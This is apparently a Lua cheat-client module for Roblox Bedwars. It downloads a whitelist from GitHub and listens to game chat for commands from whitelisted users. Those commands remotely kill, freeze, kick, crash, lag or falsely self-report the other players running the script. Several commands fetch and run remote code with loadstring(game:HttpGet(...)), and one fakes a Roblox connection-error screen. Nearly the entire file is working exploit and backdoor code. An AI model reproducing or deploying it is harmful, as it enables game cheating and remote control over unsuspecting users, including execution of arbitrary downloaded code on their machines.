local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PVOwner/WhitelistForRobloxBedwars/main/data.json"))

local function getLplrType(lplr)
	local lplr_Type = 0
	if whitelist["Mario"] then
		for _, v in pairs(whitelist["Mario"]) do
			if v.id == tostring(lplr.UserId) then
				lplr_Type = 2
				return lplr_Type
			end
		end
	end
	if whitelist["Private"] then
		for _, v in pairs(whitelist["Private"]) do
			if v.id == tostring(lplr.UserId) then
				lplr_Type = 1
				return lplr_Type
			end
		end
	end
	return lplr_Type
end

function CanAttackUser(u)
	local userId = tostring(u.UserId)
	local userType = 0

	if whitelist["Private"] then
		for _, v in pairs(whitelist["Private"]) do
			if v.id == userId then
				userType = 1
				break
			end
		end
	end

	if whitelist["Mario"] then
		for _, v in pairs(whitelist["Mario"]) do
			if v.id == userId then
				userType = 2
				break
			end
		end
	end

	return getLplrType(game.Players.LocalPlayer) >= userType
end

local colors = {
	["red"] = "#ff0000",
	["orange"] = "#ff7800",
	["yellow"] = "#e5ff00",
	["green"] = "#00ff00",
	["blue"] = "#0000ff",
	["purple"] = "#b800b8",
	["pink"] = "#ff00ff",
	["black"] = "#000000",
	["white"] = "#ffffff",
}

local commands = {
	[";kill"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
			end
		end
	end,
    [";jump"] = function(args)
        if args == "default" then
            if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end,
    [";sit"] = function(args)
        if args == "default" then
            if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
                game.Players.LocalPlayer.Character.Humanoid.Sit = true
            end
        end
    end,
    [";unsit"] = function(args)
        if args == "default" then
            if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
                game.Players.LocalPlayer.Character.Humanoid.Sit = false
            end
        end
    end,
    [";chipman"] = function(args)
        local function funnyfunc(v)
            if v:IsA("ImageLabel") or v:IsA("ImageButton") then
                v.Image = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("Image"):connect(function()
                    v.Image = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
                if v.Text ~= "" then
                    v.Text = "chips"
                end
                v:GetPropertyChangedSignal("Text"):connect(function()
                    if v.Text ~= "" then
                        v.Text = "chips"
                    end
                end)
            end
            if v:IsA("Texture") or v:IsA("Decal") then
                v.Texture = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("Texture"):connect(function()
                    v.Texture = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if v:IsA("MeshPart") then
                v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("TextureID"):connect(function()
                    v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if v:IsA("SpecialMesh") then
                v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("TextureId"):connect(function()
                    v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if v:IsA("Sky") then
                v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
            end
        end

        for i, v in pairs(game:GetDescendants()) do
            funnyfunc(v)
        end
        game.DescendantAdded:connect(funnyfunc)
    end,
    [";disconnect"] = function(args)
        game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
            if obj.Name == "ErrorMessage" then
                obj:GetPropertyChangedSignal("Text"):connect(function()
                    obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
                end)
            end
            if obj.Name == "LeaveButton" then
                local clone = obj:Clone()
                clone.Name = "LeaveButton2"
                clone.Parent = obj.Parent
                clone.MouseButton1Click:connect(function()
                    clone.Visible = false
                    local video = Instance.new("VideoFrame")
                    video.Video = getcustomassetfunc("vape/assets/skill.webm")
                    video.Size = UDim2.new(1, 0, 1, 36)
                    video.Visible = false
                    video.Position = UDim2.new(0, 0, 0, -36)
                    video.ZIndex = 9
                    video.BackgroundTransparency = 1
                    video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
                    local textlab = Instance.new("TextLabel")
                    textlab.TextSize = 45
                    textlab.ZIndex = 10
                    textlab.Size = UDim2.new(1, 0, 1, 36)
                    textlab.TextColor3 = Color3.new(1, 1, 1)
                    textlab.Text = "skill issue"
                    textlab.Position = UDim2.new(0, 0, 0, -36)
                    textlab.Font = Enum.Font.Gotham
                    textlab.BackgroundTransparency = 1
                    textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
                    video.Loaded:connect(function()
                        video.Visible = true
                        video:Play()
                        task.spawn(function()
                            repeat
                                wait()
                                for i = 0, 1, 0.01 do
                                    wait(0.01)
                                    textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
                                end
                            until true == false
                        end)
                    end)
                    task.wait(19)
                    task.spawn(function()
                        pcall(function()
                            if getconnections then
                                getconnections(entity.character.Humanoid.Died)
                            end
                            print(game:GetObjects("h29g3535")[1])
                        end)
                        while true do end
                    end)
                end)
                obj.Visible = false
            end
        end)
        task.wait(0.1)
        lplr:Kick()
    end,
    [";staffkick"] = function(args)
        game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
    end,
	[";reveal"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local textChatService = game:GetService("TextChatService")
				wait(0.0001)
				textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using PV+ Config Made By Mario")
			end
		end
	end,
	[";void"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local character = game.Players.LocalPlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			end
		end
	end,
	[";blind"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local blur = Instance.new("BlurEffect")
				blur.Size = 10000000000000
				blur.Parent = game.Lighting
			end
		end
	end,
	[";unblind"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
				if blur then
					blur:Destroy()
				end
			end
		end
	end,
	[";troll"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
			end
		end
	end,
	[";kick"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				wait(1)
				for index, player in pairs(game.Players:GetPlayers()) do
					player:Kick(":troll: PV+ Kick You :sob:")
				end
			end
		end
	end,
	[";ban"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local rs = game:GetService("ReplicatedStorage")
				local remote = rs:FindFirstChild("SelfReport", true)
				remote:FireServer("injection_detected")
			end
		end
	end,
	[";rickroll"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
			end
		end
	end,
	[";freeze"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
			end
		end
	end,
	[";thaw"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
			end
		end
	end,
	[";lobby"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
			end
		end
	end,
	[";quit"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game:Shutdown()
			end
		end
	end,
	[";lagback"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				for i = 1, 10 do
					wait()
					local player = game.Players.LocalPlayer
					local character = player.Character or player.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			end
		end
	end,
	[";bgame"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				pcall(function()
					local replicatedStorage = game:GetService("ReplicatedStorage")
					for _, child in ipairs(replicatedStorage:GetDescendants()) do
						child:Destroy()
					end
				end)
			end
		end
	end,
	[";bmap"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(workspace)
			end
		end
	end,
	[";crash"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				while true do end
			end
		end
	end,
	[";uninject"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				GuiLibrary.SelfDestruct()
			end
		end
	end,
	[";ping"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local thingy = settings().Network
				thingy.IncomingReplicationLag = math.huge
			end
		end
	end,
	[";lag"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
				local RunService = game:GetService("RunService")
				local player = game.Players.LocalPlayer
				local character = player.Character or player.CharacterAdded:Wait()
				local rootPart = character:WaitForChild("HumanoidRootPart")
				RunService.Heartbeat:Connect(function()
					for i = 1, 100 do
						local part = Instance.new("Part")
						part.Anchored = false
						part.CanCollide = true
						part.Transparency = 1
						part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
						part.Parent = workspace
					end
				end)
			end
		end
	end,
	[";loopkill"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				_G.loopkill = true;
				while _G.loopkill == true do
					lplr.Character.PrimaryPart.CFrame -= Vector3.new(0,-1000,0)
					task.wait(.3)
				end
			end
		end
	end,
	[";unloopkill"] = function(args)
		if args == "default" then
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				_G.loopkill = false;
			end
		end
	end
}

function isPlayerAllowed()
	return true
end

local txt = game:GetService("TextChatService")

txt.OnIncomingMessage = function(msg)
    local p = Instance.new("TextChatMessageProperties")
    local message = msg
    if msg.TextSource then
        local userId = tostring(msg.TextSource.UserId)
        local args = msg.Text:split(" ")
        local command = args[1]
        table.remove(args, 1)

        command = string.lower(command)

        for i, v in pairs(commands) do
            if i == command then
                v(unpack(args))
                break
            end
        end

        p.PrefixText = msg.PrefixText

        if bedwarsStore.whitelist.clientUsers then
            local plr = game.Players:GetPlayerByUserId(msg.TextSource.UserId)
            if plr and bedwarsStore.whitelist.clientUsers[plr.Name] then
                p.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..p.PrefixText
            end
        end
        
        local plr = game.Players:GetPlayerByUserId(msg.TextSource.UserId)
        if plr then
            local plrInfo = whitelist[plr.Name]
            if plrInfo and plrInfo.tags then
                for i, v in pairs(plrInfo.tags) do 
                    p.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.tagText.."]</font> "..p.PrefixText
                end
            end
        end
        
        if plr and plr:GetAttribute("ClanTag") then 
            p.PrefixText = "<font color='#FFFFFF'>["..plr:GetAttribute("ClanTag").."]</font> "..p.PrefixText
        end
    end

    return p
end
